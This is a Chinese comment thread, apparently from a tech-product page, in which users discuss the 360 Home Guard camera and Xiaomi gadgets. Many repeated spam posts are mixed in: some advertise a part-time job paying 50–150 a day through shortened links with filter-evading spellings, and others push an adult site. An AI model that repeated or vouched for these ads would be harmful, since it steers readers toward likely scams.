～---------- 不限制工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～ （宝妈、学生、上班族都可以）
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
奇酷360不错，现在出了360家庭卫士不知道怎么样呢？
～------ 不限制工作时间，做的越多挣的越多～【 http://t.cn/RPyMAKa 】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～ （宝妈、学生、上班族都可以）
～---------- 不限制工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～ （宝妈、学生、上班族都可以）
给你永远的支持。期望惠及更多用户。
～---------- 不限制工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我 详细作讲解～ ～ （宝妈、学生、上班族都可以）
～---------- 不限制工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～ （宝妈、学生、上班族都可以）
我是好像要啊 
不会是骗人的吧
什么时候卖  啊   我想买  希望便宜  我很穷的
额   感觉这话有点无耻了啊
菜鸟们飞机操控都不行，怎能航拍。。。还有，这么小的飞机能有陀螺定位仪么？能稳稳的停在空中么拍摄么。。飞机不行，操控不行还拍个毛。。。
～-------- 不限制工作时间，做的越多挣的越多～【 http://t.cn/RPyMAKa 】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～ （宝妈、学生、上班族都可以）
感觉太科幻了
～-------- 不限制工作时间，做的越多挣的越多～【 http://t.cn/RPyMAKa 】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～ （宝妈、学生、上班族都可以
真搞笑     呵呵
 男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
楼下发广告、假的大家不要信
有神器在手，以后应该不会丢东西了
 360家庭卫士摄像头是一款可将通过互联网远程监控家里情况的硬件产品，配合360家庭卫士手机客户端，用户可以通过手机随时随地监控家里的情况。
希望好用，
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝 妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
你学过物理吗。。。不知道不要瞎评论。
造型奇异，想法大胆
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝 妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
期待中，盼盼盼！
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝 妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
伊卡洛斯头像狂赞
伊卡洛斯头像狂赞 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝 妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
希望很好用
这个还满酷的哎~
奇虎360
迫切想试用一下，好期待 ！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
这个很实用啊，前段时间刚把钱包丢了，都不知道怎么丢的、什么时候在哪儿丢的，郁闷 要是有这个就不会丢了
～ 不限制----------工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ --不限制----------工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
哈哈，体验一把就得了 不能当真哦~
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏  览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （  宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
很有科技范的感觉哦！爱死了！
可惜我已经有了，能控制在1000元应该还不错。
需要邮费吗？
非常喜欢，环境非常舒服。
需要邮费吗？
要当智能硬件使用先锋，就来这里尝试吧！我们期待中！
 男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
一直很是支持小米，这次要比3好看很多
本来打算要买酷品的那个智能手环的，但小米这招，实在受不了啊，果断要小米的了！！
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏 览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
小米2S能用吗
呵呵，装比
360团队真的很给力，我用360软件（360杀毒、卫士）N年了。360安全卫士级别是31级了，360带给我极大的上网安全感是我信任360产品的原因。希望360家庭卫士能带给我别样的新感情。
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很时尚，外形喜欢，但是功能一般
这个产品很不错的，抢一个去，外出比较方便而且安全
只支持米柚
我想说....USB口 可以接无线网卡- -
希望很好用 
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏 览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
